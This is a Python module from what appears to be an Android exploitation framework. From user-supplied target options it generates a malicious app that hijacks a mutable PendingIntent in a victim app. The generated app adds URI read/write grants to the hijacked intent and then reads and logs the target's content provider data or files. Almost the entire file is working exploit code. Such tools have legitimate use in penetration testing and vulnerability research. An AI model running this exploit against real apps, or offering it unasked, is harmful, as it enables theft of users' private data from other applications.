from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_int import OptInt
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "mutable_pending_intent_basic"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: False)", False]),
            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptList("INTENT_EXTRA", [False, "Intent extra data"]),
            OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
            OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [True, "Target class name"]),
            OptStr("EXTRA_KEY", [True, "Wrapper intent extra key"]),
            OptStr("INTENT_ACTION", [True, "Action name to intercept"]),
            OptInt("REQUEST_CODE", [True, "Pending intent request code"])
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": ["target_class"]
            },
            "is_exported": {
                "pos": ["via_deeplink"],
                "neg": []
            },
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        manifest = [
            self._template.build_manifest_component(
                self.intercept_activity_name(self._id, opts['TARGET_PACKAGE']),
                is_exported=True,
                intercept=True,
                action=opts['INTENT_ACTION']
            ),
            self._template.build_manifest_component(
                self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE']),
                is_exported=True,
                intercept=True,
                action="sherlock.poc.MUTABLE_PENDING_INTENT_BASIC"
            ),
            self._template.build_manifest_component(
                self.activity_name(self._id, opts['TARGET_PACKAGE'])
            )
        ]

        hijack_activity = self._template.build_activity(
            name=self.intercept_activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.app.PendingIntent",
                "android.content.ClipData",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Log",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            on_create=[
                f"PendingIntent pi = getIntent().getParcelableExtra(\"{opts['EXTRA_KEY']}\");",
                self._template.build_intent(
                    intent_var="hijackIntent",
                    set_action="sherlock.poc.MUTABLE_PENDING_INTENT_BASIC",
                    set_clipdata=opts['PROVIDER_URI'],
                    set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                    start_activity=False
                ),
                f"try {{ pi.send(this, {opts['REQUEST_CODE']}, hijackIntent, null, null); }} catch (PendingIntent.CanceledException e) {{ Log.e(\"FAILED\", \"Failed to send pending intent: \" + e); }}"
            ]
        )

        leak_provider_activity = self._template.build_activity(
            name=self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            on_create=[
                "Uri uri = getIntent().getClipData().getItemAt(0).getUri();",
                self._template.resolve_content(opts['PROVIDER_TYPE'])
            ]
        )

        exploit_activity = self._template.build_activity(
            name=self.activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if opts['VIA_DEEPLINK'] else None,
                set_data=f"\"{opts['DEEPLINK_URI']}\"" if opts['VIA_DEEPLINK'] else None,
                put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['INTENT_EXTRA']] if opts['INTENT_EXTRA'] != "" else [],
                set_classname=[opts['TARGET_PACKAGE'], opts['TARGET_CLASS']] if not opts['VIA_DEEPLINK'] else []
            )]
        )

        component = [
            {
                "name": f"{self.intercept_activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": hijack_activity 
            },
            {
                "name": f"{self.leak_provider_activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": leak_provider_activity 
            },
            {
                "name": f"{self.activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": exploit_activity 
            }
        ]

        if not opts['IS_EXPORTED']:
            manifest.pop()
            component.pop()

        app = {
            "manifest": manifest,
            "layout": self._template.button_layout(self._id, opts['TARGET_PACKAGE']) if opts['IS_EXPORTED'] else None,
            "bind_button": self._template.bind_button(self._id, opts['TARGET_PACKAGE']) if opts['IS_EXPORTED'] else None,
            "component": component
        }

        stat = {
            "failed": [
                {
                    "regex": r"^.*java\.lang\.SecurityException:.*$",
                    "msg": r"java\.lang\.SecurityException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.NullPointerException:.*$",
                    "msg": r"java\.lang\.NullPointerException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.RuntimeException:.*$",
                    "msg": r"java\.lang\.RuntimeException:.*"
                }
            ],
            "succeed": {
                "regex": r"^.*ELEMENTARY!!!.*$",
                "data": r"Data:.*"
            }
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Module failed to execute, terminating module..\n")
            return
        
        if not opts['IS_EXPORTED']:
            log.warning("Press the button displayed to execute the exploit module.")
        else:
            log.warning(f"Navigate to target class: \"{opts['TARGET_CLASS']}\" and trigger the pending intent.")

        self.check_logcat(stat)


# DONE
# RETESTED